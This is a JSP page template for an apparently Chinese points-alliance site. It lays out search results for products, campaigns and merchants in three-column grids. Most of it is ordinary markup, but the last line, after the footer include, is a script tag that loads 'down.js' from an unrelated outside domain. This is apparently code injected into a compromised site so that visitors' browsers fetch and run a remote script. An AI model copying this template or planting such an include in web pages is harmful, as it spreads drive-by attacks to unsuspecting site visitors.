<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<c:set var="title" value="积分联盟-查询所有"/> 
<%@ include file="IncludeTop.jsp" %>

<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td background="images/left_border.gif" width="10"></td>
    <td width="198" height="129" valign="top">
     	<%@ include file="searchProductBar.jsp" %>
		<%@ include file="searchAllBar.jsp" %>
		<%@ include file="newsBar.jsp" %>
	</td>
    <td bgcolor="#FFFFFF" valign="top" width="562"> 
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr background="images/splitLine.jpg"> 
          <td colspan="4" height="13"></td>
        </tr>
        <tr> 
          <td width="6">&nbsp;</td>
          <td width="181"><a href='<c:url value="/queryProduct.do"/>'><img src="images/index_55.gif" alt="" border="0"></a></td>
          <td background="images/index_56.gif" align="right"><a href='<c:url value="/queryProduct.do"/>?productKey=<c:out value="${result.queryKey}"/>' class="red">更多。。。</a></td>
          <td rowspan="2" width="25">&nbsp;</td>
        </tr>
        <tr> 
          <td width="6">&nbsp;</td>
          <td width="181">&nbsp;</td>
          <td>&nbsp;</td>
        </tr>
      </table>
	  <c:set var="trBegin" value='<tr>' />
	  <c:set var="trEnd" value='</tr>' /> 
      <c:set var="colomnSize" value="3" /> 
      <table width="100%" border="0" cellspacing="15" cellpadding="0">
        <c:forEach var="product" items="${result.productList}" varStatus="status"> 
        <c:if test="${status.count mod colomnSize eq 1}">
			<c:out value="${trBegin}" escapeXml="false" /> 
        </c:if> 
		<td width="33%" height="130"> 
            <table width="100%" height="100%" border="0" cellpadding="0" cellspacing="1" bordercolor="0" bgcolor="#CCCCCC">
              <tr> 
                <td> 
                  <table cellspacing="0" cellpadding="0" width="100%" height="100%" border="0" bgcolor="#FFFFFF">
                    <tr> 
                      <td align="center" rowspan="2" width="101"><a href='/getProductInfo.do?productNo=<c:out value="${product.productNo}"/>'><img src='images/product/<c:out value="${product.productNo}"/>.jpg' width="85" height="85" border="0"></a></td>
                      <td width="166" height="36"><c:out value="${product.name}"/></td>
                    </tr>
                    <tr> 
                      <td height="31" width="166"><c:out value="${product.intro}"/><span class="red15"><c:out value="${product.point}"/>分</span> 
                      </td>
                    </tr>
                    <tr> 
                      <td align="center" rowspan="2" colspan="2" height="45"> 
                        <p><a href='<c:url value="/addExchange.do"/>?productNo=<c:out value="${product.productNo}"/>'><img src="images/index_103.gif" alt="" width="45" height="25" border="0"></a></p>
                      </td>
                    </tr>
                  </table>
                </td>
              </tr>
            </table>
          </td>
        <c:if test="${status.count mod colomnSize eq 0}">
			<c:out value="${trEnd}" escapeXml="false" />
        </c:if>
		<c:if test="${status.count mod colomnSize ne 0  and status.last}"> 
			<c:forEach var="x" begin="${status.count mod colomnSize}" end="${colomnSize-1}" step="1"> 
				<td>&nbsp; </td>
			</c:forEach>
         </c:if> 
        </c:forEach>
      </table>
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr background="images/splitLine.jpg"> 
          <td colspan="4" height="13"></td>
        </tr>
        <tr> 
          <td width="6" height="20">&nbsp;</td>
          <td height="20"><a href='<c:url value="/queryCampaign.do"/>'><img src="images/titilesheet2.gif" alt="" border="0"></a></td>
          <td background="images/index_56.gif" align="right" height="20"><a href='<c:url value="/queryCampaign.do"/>?campaignKey=<c:out value="${result.queryKey}"/> ' class="red">更多。。。</a></td>
          <td rowspan="2" width="25">&nbsp;</td>
        </tr>
        <tr> 
          <td width="6">&nbsp;</td>
          <td width="181">&nbsp;</td>
          <td>&nbsp;</td>
        </tr>
      </table>
	  <c:set var="colomnSize" value="3" /> 
      <table width="100%" border="0" cellspacing="10">
        <c:forEach var="campaign" items="${result.campaignList}" varStatus="status"> 
        <c:if test="${status.count mod colomnSize eq 1}">
			<c:out value="${trBegin}" escapeXml="false" /> 
        </c:if> 
          <td width="33%"> 
            <table width="100%" height="100%" border="0" cellpadding="0" cellspacing="1" bordercolor="0" bgcolor="#CCCCCC">
              <tr> 
                <td> 
                  <table cellspacing="0" cellpadding="0" width="100%" height="100%" border="0" bgcolor="#FFFFFF">
                    <tr> 
                      <td align="center" rowspan="2" width="101"><a href='<c:url value="/getCampaignInfo.do"/>?campaignNo=<c:out value="${campaign.campaignNo}"/>'><img src='images/campaign/<c:out value="${campaign.campaignNo}"/>.jpg' width="85" height="85" border="0" ></a></td>
                      <td height="31"><c:out value="${campaign.title}"/></td>
                    </tr>
                    <tr> 
                      <td height="57"><c:out value="${campaign.intro}"/></td>
                    </tr>
                    <tr> 
                      <td align="center" rowspan="2" colspan="2">
					 	<a href='<c:url value="/getMerchantInfo.do"/>?merchantNo=<c:out value="${campaign.merchantNo}"/>'><c:out value="${campaign.merchantName}"/></a>
					  </td>
                    </tr>
                  </table>
                </td>
              </tr>
            </table>
          </td>          
        <c:if test="${status.count mod colomnSize eq 0}">
			<c:out value="${trEnd}" escapeXml="false" />
        </c:if>
		<c:if test="${status.count mod colomnSize ne 0  and status.last}"> 
			<c:forEach var="x" begin="${status.count mod colomnSize}" end="${colomnSize-1}" step="1"> 
				<td >&nbsp; </td>
			</c:forEach>
         </c:if> 
        </c:forEach>
      </table>
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr background="images/splitLine.jpg"> 
          <td colspan="4" height="13"></td>
        </tr>
        <tr> 
          <td width="6">&nbsp;</td>
          <td><a href='<c:url value="/queryMerchant.do"/>'>最近加盟商户</a></td>
          <td background="images/index_56.gif" align="right"><a href='<c:url value="/queryMerchant.do"/>?merchantKey=<c:out value="${result.queryKey}"/>' class="red">更多。。。</a></td>
          <td rowspan="2" width="25">&nbsp;</td>
        </tr>
        <tr> 
          <td width="6" height="15">&nbsp;</td>
          <td width="181" height="15">&nbsp;</td>
          <td height="15">&nbsp;</td>
        </tr>
    </table>
    <table width="100%" border="0" cellspacing="10">
        <c:forEach var="merchant" items="${result.merchantList}" varStatus="status"> 
        <c:if test="${status.count mod colomnSize eq 1}">
			<c:out value="${trBegin}" escapeXml="false" /> 
        </c:if> 
          <td width="33%"> 
            <table width="100%" height="100%" border="0" cellpadding="0" cellspacing="1" bordercolor="0" bgcolor="#CCCCCC">
              <tr> 
                <td> 
                  <table cellspacing="0" cellpadding="0" width="100%" height="100%" border="0" bgcolor="#FFFFFF">
                    <tr> 
                      <td align="center" rowspan="2" width="101"><a href='<c:url value="/getMerchantInfo.do"/>?merchantNo=<c:out value="${merchant.merchantNo}"/>'><img src='images/merchant/<c:out value="${merchant.merchantNo}"/>.jpg' width="85" height="85" border="0" ></a></td>
                      <td height="31"><c:out value="${merchant.merchantName}"/></td>
                    </tr>
                    <tr> 
                      <td height="57"><c:out value="${merchant.intro}"/></td>
                    </tr>
                  </table>
                </td>
              </tr>
            </table>
          </td>          
        <c:if test="${status.count mod colomnSize eq 0}">
			<c:out value="${trEnd}" escapeXml="false" />
        </c:if>
		<c:if test="${status.count mod colomnSize ne 0  and status.last}"> 
			<c:forEach var="x" begin="${status.count mod colomnSize}" end="${colomnSize-1}" step="1"> 				
          		<td>&nbsp; </td>
			</c:forEach>
         </c:if> 
        </c:forEach>
      </table>
        
    </td>
    <td width="10" bgcolor="#FFFFFF" valign="top" background="images/right_border.gif">&nbsp;</td>
  </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>